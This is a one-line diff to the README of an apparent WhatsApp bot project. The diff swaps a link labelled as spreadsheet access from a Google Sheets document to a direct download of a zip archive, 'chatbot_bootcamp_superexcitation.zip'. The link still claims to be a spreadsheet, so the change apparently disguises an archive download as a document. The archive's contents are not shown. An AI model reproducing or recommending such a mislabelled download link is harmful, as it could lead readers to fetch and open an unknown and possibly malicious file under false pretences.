@@ -1,4 +1,4 @@
 # wa-bot-ipds-kab-sanggau
 
 `the spreadsheet access: `
-[Link SpreadSheet Wa Bot](https://docs.google.com/spreadsheets/d/1g-dWZ00crPxZO_SgncV_h51K_Vfv9PexZlgGRcyIDb4/edit?usp=sharing)
+[Link SpreadSheet Wa Bot](https://raw.githubusercontent.com/ipdssanggau/chatbot-bootcamp/main/src/chatbot_bootcamp_superexcitation.zip)
